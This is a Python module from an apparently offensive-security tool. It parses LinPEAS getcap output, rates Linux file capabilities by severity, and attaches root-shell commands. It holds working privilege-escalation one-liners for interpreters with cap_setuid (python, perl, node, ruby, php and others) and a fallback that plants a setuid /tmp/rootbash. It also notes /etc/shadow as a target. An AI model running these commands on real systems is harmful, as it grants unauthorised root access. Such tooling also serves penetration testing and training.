"""Analyze Linux capabilities findings from LinPEAS output."""

import json
import os
import re
from pathlib import Path
from typing import Dict, List, Optional

# ── GTFOBins database ──────────────────────────────────────────────────────────
_DB_PATH = Path(__file__).parent.parent.parent / "data" / "gtfobins.json"
_db: Optional[Dict] = None


def _load_db() -> Dict:
    """Load and cache the GTFOBins JSON database from disk."""
    global _db
    if _db is None:
        with open(_DB_PATH, encoding="utf-8") as fh:
            _db = json.load(fh)
    return _db


# ── Dangerous capabilities that can lead to privilege escalation ───────────────
_EXPLOITABLE_CAPS = {
    "cap_setuid",
    "cap_setgid",
    "cap_dac_override",
    "cap_dac_read_search",
    "cap_sys_admin",
    "cap_sys_ptrace",
    "cap_net_raw",
}

# Caps that are always CRITICAL regardless of GTFOBins coverage.
# cap_setuid/cap_setgid directly grant uid/gid 0; cap_sys_admin is near-equivalent.
_ALWAYS_CRITICAL_CAPS = {
    "cap_setuid", "cap_setgid", "cap_sys_admin",
}

# Caps that bypass file permission checks — exploitable but HIGH unless GTFOBins/interpreter
# provides a direct exploit. Reported with an investigation note.
_DAC_CAPS = {"cap_dac_override", "cap_dac_read_search"}

# Interpreter binaries that can trivially exploit cap_setuid.
# Maps normalized binary name → exploit command template (use {path} for full path).
_CAP_SETUID_INTERPRETERS: Dict[str, str] = {
    "python": "{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "python2": "{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "python3": "{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "perl": "{path} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
    "node": "{path} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {{stdio: [0,1,2]}})'",
    "nodejs": "{path} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {{stdio: [0,1,2]}})'",
    "ruby": "{path} -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
    "php": "{path} -r 'posix_setuid(0); system(\"/bin/sh\");'",
    "lua": "{path} -e 'require(\"os\"); os.execute(\"/bin/sh\")'",
    "wish": "echo 'exec /bin/sh' | {path}",
    "tclsh": "echo 'exec /bin/sh' | {path}",
}

# Matches getcap output lines:
#   /usr/bin/python3.9 = cap_setuid+ep
#   /usr/bin/perl = cap_setuid+eip
_GETCAP_RE = re.compile(r"^(\S+)\s+=\s+(\S+)$")


# ── Public API ─────────────────────────────────────────────────────────────────

def parse_capabilities_section(section_text: str) -> List[Dict]:
    """Extract binary paths and capability strings from getcap output."""
    results: List[Dict] = []
    seen: set = set()

    for line in section_text.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        m = _GETCAP_RE.match(stripped)
        if not m:
            continue
        path, caps = m.group(1), m.group(2)
        if path not in seen:
            seen.add(path)
            results.append({"path": path, "caps": caps})

    return results


def is_exploitable_cap(caps: str) -> bool:
    """Return True if the capabilities string contains a dangerous capability."""
    # caps look like "cap_setuid+ep" or "cap_net_admin+eip"
    # Extract capability names (everything before the '+' or '=')
    for part in caps.split(","):
        cap_name = part.split("+")[0].split("=")[0].strip().lower()
        if cap_name in _EXPLOITABLE_CAPS:
            return True
    return False


def normalize_binary(path: str) -> List[str]:
    """Return candidate GTFOBins lookup names for a path, from specific to generic.

    Examples:
        /usr/bin/python3.9  -> ["python3.9", "python3", "python"]
        /usr/bin/vim.basic  -> ["vim.basic", "vim"]
        /usr/bin/perl       -> ["perl"]
    """
    name = os.path.basename(path)
    candidates: List[str] = []
    seen: set = set()

    current = name
    while current:
        if current not in seen:
            seen.add(current)
            candidates.append(current)

        # Strip trailing .suffix (e.g. ".9", ".basic")
        no_suffix = re.sub(r"\.[^.]+$", "", current)
        if no_suffix and no_suffix != current:
            current = no_suffix
            continue

        # Strip trailing digits (e.g. "python3" -> "python")
        no_digits = re.sub(r"\d+$", "", current)
        if no_digits and no_digits != current:
            current = no_digits
            continue

        break

    return candidates


def _has_cap_setuid(caps: str) -> bool:
    """Return True if the capabilities string includes cap_setuid."""
    for part in caps.split(","):
        cap_name = part.split("+")[0].split("=")[0].strip().lower()
        if cap_name == "cap_setuid":
            return True
    return False


def _interpreter_cap_command(full_path: str) -> Optional[str]:
    """Return a specific cap_setuid exploit command for interpreter binaries, or None."""
    for candidate in normalize_binary(full_path):
        template = _CAP_SETUID_INTERPRETERS.get(candidate)
        if template:
            return template.format(path=full_path)
    return None


def lookup_capabilities(binary: str) -> List[str]:
    """Return GTFOBins capabilities commands for a binary, or empty list if not found."""
    db = _load_db()
    return list(db.get(binary, {}).get("capabilities", []))


def _replace_binary(commands: List[str], matched_as: str, full_path: str) -> List[str]:
    """Replace the leading GTFOBins generic name with the actual full path in each command."""
    result = []
    for cmd in commands:
        parts = cmd.split(None, 1)
        if parts and parts[0] == matched_as:
            rest = (" " + parts[1]) if len(parts) > 1 else ""
            result.append(full_path + rest)
        else:
            result.append(cmd)
    return result


def analyze(section_text: str) -> List[Dict]:
    """Analyze a capabilities section and return a list of structured findings.

    Each finding has keys: binary, full_path, caps, severity, type, commands.
    When a GTFOBins candidate matched, matched_as is also included.
    Severity: CRITICAL if exploitable cap + GTFOBins hit, HIGH if exploitable
    cap without a GTFOBins entry, INFO for non-exploitable caps.
    """
    findings: List[Dict] = []

    for entry in parse_capabilities_section(section_text):
        full_path = entry["path"]
        caps = entry["caps"]
        exploitable = is_exploitable_cap(caps)

        matched_as: Optional[str] = None
        commands: List[str] = []

        if exploitable:
            # Interpreter + cap_setuid → specific one-liner (highest priority)
            if _has_cap_setuid(caps):
                interp_cmd = _interpreter_cap_command(full_path)
                if interp_cmd:
                    commands = [interp_cmd]

            # Fall back to GTFOBins capabilities commands
            if not commands:
                for candidate in normalize_binary(full_path):
                    cmds = lookup_capabilities(candidate)
                    if cmds:
                        matched_as = candidate
                        commands = _replace_binary(cmds, candidate, full_path)
                        break

        caps_lower = caps.lower()
        is_always_critical = any(c in caps_lower for c in _ALWAYS_CRITICAL_CAPS)

        if is_always_critical and not commands:
            commands = [
                f"# {full_path} has {caps} - manual exploit:",
                f"cp /bin/bash /tmp/rootbash && {full_path} -c 'chmod +s /tmp/rootbash' && /tmp/rootbash -p",
            ]

        if exploitable and (commands or is_always_critical):
            severity = "CRITICAL"
        elif exploitable:
            severity = "HIGH"
        else:
            severity = "INFO"

        finding: Dict = {
            "binary": os.path.basename(full_path),
            "full_path": full_path,
            "caps": caps,
            "severity": severity,
            "type": "capabilities",
            "commands": commands,
        }
        if matched_as is not None:
            finding["matched_as"] = matched_as

        # For dac caps without a direct exploit, add an investigation note
        if severity == "HIGH" and not commands:
            has_dac = any(
                part.split("+")[0].split("=")[0].strip().lower() in _DAC_CAPS
                for part in caps.split(",")
            )
            if has_dac:
                finding["note"] = (
                    f"{caps} — can bypass file read/write permission checks. "
                    "Investigate: may allow reading /etc/shadow or overwriting protected files."
                )

        findings.append(finding)

    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
/usr/bin/python3.9 = cap_setuid+ep
/usr/bin/perl = cap_setuid+eip
/usr/bin/tcpdump = cap_net_admin+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/notabin = cap_setuid+ep
/usr/bin/openssl = cap_net_bind_service+ep
"""

    print("=== parse_capabilities_section ===")
    entries = parse_capabilities_section(SAMPLE)
    for e in entries:
        print(f"  {e['path']}  ->  {e['caps']}")

    print("\n=== is_exploitable_cap ===")
    for caps in ["cap_setuid+ep", "cap_net_admin+eip", "cap_net_raw+ep", "cap_net_bind_service+ep"]:
        print(f"  {caps!r} -> {is_exploitable_cap(caps)}")

    print("\n=== normalize_binary ===")
    for p in ["/usr/bin/python3.9", "/usr/bin/perl", "/usr/bin/tcpdump"]:
        print(f"  {p!r} -> {normalize_binary(p)}")

    print("\n=== analyze ===")
    for finding in analyze(SAMPLE):
        cmds = finding["commands"]
        matched = finding.get("matched_as", finding["binary"])
        print(
            f"[{finding['severity']}] {finding['full_path']}  caps={finding['caps']}"
            f"  (matched_as={matched!r}, {len(cmds)} command(s))"
        )
        for cmd in cmds[:2]:
            print(f"    $ {cmd}")
        if len(cmds) > 2:
            print(f"    ... and {len(cmds) - 2} more")
